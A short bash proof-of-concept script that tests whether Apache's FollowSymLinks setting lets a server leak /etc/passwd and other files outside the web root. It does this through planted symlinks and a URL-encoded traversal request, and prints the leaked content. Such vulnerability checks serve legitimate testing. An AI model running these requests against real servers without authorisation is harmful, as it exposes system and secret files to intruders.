#!/bin/bash
# POC: Symlink-Based File Access Exploitation via Apache FollowSymLinks
# This demonstrates how Apache's FollowSymLinks directive can be exploited
# to access sensitive files outside the intended web root

TARGET_URL="${1:-http://localhost:8080}"
WEB_ROOT="${2:-./}"

echo "[*] Testing Symlink-Based File Access Exploitation"
echo "[*] Target URL: $TARGET_URL"
echo "[*] Web Root: $WEB_ROOT"
echo ""

# Test 1: Check if symlinks to /etc/passwd are accessible
echo "[+] Test 1: Checking if symlinks to sensitive files are accessible"
PASSWD_LINK="$WEB_ROOT/passwd_link.txt"
if [ -L "$PASSWD_LINK" ]; then
    echo "[✓] Symlink to /etc/passwd exists at $PASSWD_LINK"
    RESPONSE=$(curl -s "$TARGET_URL/passwd_link.txt" 2>&1)
    if echo "$RESPONSE" | grep -q "root:"; then
        echo "[✓] VULNERABLE: Successfully accessed /etc/passwd through symlink"
        echo "[✓] First line: $(echo "$RESPONSE" | head -1)"
        exit 0
    fi
fi

# Test 2: Check if directory traversal with symlinks works
echo "[+] Test 2: Checking URL-encoded directory traversal with symlinks"
RESPONSE=$(curl -s "$TARGET_URL/..%2fpasswd_link.txt" 2>&1)
if echo "$RESPONSE" | grep -q "root:"; then
    echo "[✓] VULNERABLE: Successfully accessed /etc/passwd through URL-encoded traversal"
    echo "[✓] First line: $(echo "$RESPONSE" | head -1)"
    exit 0
fi

# Test 3: Check generic symlink access
echo "[+] Test 3: Checking generic symlink to test file"
SECRET_LINK="$WEB_ROOT/secret_link.txt"
if [ -L "$SECRET_LINK" ]; then
    echo "[✓] Symlink to test file exists at $SECRET_LINK"
    RESPONSE=$(curl -s "$TARGET_URL/secret_link.txt" 2>&1)
    if [ ! -z "$RESPONSE" ] && [ "$RESPONSE" != "404" ]; then
        echo "[✓] VULNERABLE: Successfully accessed file through symlink"
        echo "[✓] Content: $RESPONSE"
        exit 0
    fi
fi

echo "[-] Could not confirm vulnerability in current environment"
exit 1
